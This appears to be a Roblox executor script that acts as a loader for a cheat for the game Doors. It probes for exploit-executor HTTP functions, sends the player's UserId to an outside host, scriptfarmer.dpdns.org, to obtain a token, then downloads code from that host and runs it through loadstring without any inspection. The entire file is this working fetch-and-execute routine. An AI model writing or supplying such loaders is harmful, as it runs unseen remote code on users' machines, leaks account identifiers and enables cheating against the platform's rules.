local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local userId = localPlayer and localPlayer.UserId or 0
local httpReq = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local token
if httpReq then
    local ok, res = pcall(function()
        return httpReq({
            Url = "https://scriptfarmer.dpdns.org/api/authtoken/generate",
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Roblox/WinInet",
                ["Roblox-Id"] = tostring(userId)
            }
        })
    end)
    if ok and res and (res.StatusCode == 200 or res.Status == 200) then
        token = res.Body or res.body
    end
end

if not token or token == "" or string.find(token, "<") then
    local ok, res = pcall(function()
        return game:HttpGet("https://scriptfarmer.dpdns.org/api/authtoken/generate")
    end)
    if ok then
        token = res
    end
end

if token then
    token = string.gsub(token, "^%s*(.-)%s*$", "%1")
end

if token and #token > 0 and not string.find(token, "Access Denied") and not string.find(token, "Too Many") then
    local scriptContent = game:HttpGet("https://scriptfarmer.dpdns.org/code/doors?token=" .. token)
    local func, err = loadstring(scriptContent)
    if func then
        func()
    else
        warn("Failed to load script: " .. tostring(err))
    end
else
    warn("Failed to obtain execution token: " .. tostring(token or "nil"))
end